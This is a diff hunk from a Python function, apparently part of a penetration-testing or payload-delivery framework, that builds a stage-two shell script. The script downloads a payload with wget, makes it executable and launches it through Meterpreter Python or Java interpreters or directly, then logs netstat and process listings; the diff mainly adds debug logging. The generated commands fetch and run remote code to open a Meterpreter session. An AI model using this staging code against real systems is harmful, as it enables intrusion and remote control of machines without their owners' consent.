@@ -750,15 +750,20 @@ def makeStageTwoShScript(targetData, httpPort, remoteLogFile, terminationToken):
             stageTwoShContent = stageTwoShContent + "echo URL =  " + url + " > " + remoteLogFile + "\n"
             stageTwoShContent = stageTwoShContent + "\nwget " + url + " >> " + remoteLogFile + " 2>&1\n"
             stageTwoShContent = stageTwoShContent + "sleep 5 \n"
-            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + "\n"
+            stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "echo \"test\n\n\" >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "echo \"ls\n\n\" >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "ls -lart " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
+            stageTwoShContent = stageTwoShContent + "file " + payloadFile + " >> " + remoteLogFile + " 2>&1\n"
             if '.py' in payloadFile:
                 stageTwoShContent = stageTwoShContent + targetData['METERPRETER_PYTHON'] + " " + payloadFile + "&\n"
             elif 'jar' in payloadFile:
                 stageTwoShContent = stageTwoShContent + targetData['METERPRETER_JAVA'] + " -jar " + payloadFile + "&\n"
             else:
                 stageTwoShContent = stageTwoShContent + "./" + payloadFile + "&\n"
+            stageTwoShContent = stageTwoShContent + "sleep 5 \n"
             stageTwoShContent = stageTwoShContent + "netstat -ant >> " + remoteLogFile + " 2>&1\n"
-            stageTwoShContent = stageTwoShContent + "ps -ef >> " + remoteLogFile + "\n"
+            stageTwoShContent = stageTwoShContent + "ps -ef >> " + remoteLogFile + "\n\n"
             stageTwoShContent = stageTwoShContent + "echo " + terminationToken + " >> " + remoteLogFile + "\n"
     return stageTwoShContent
 
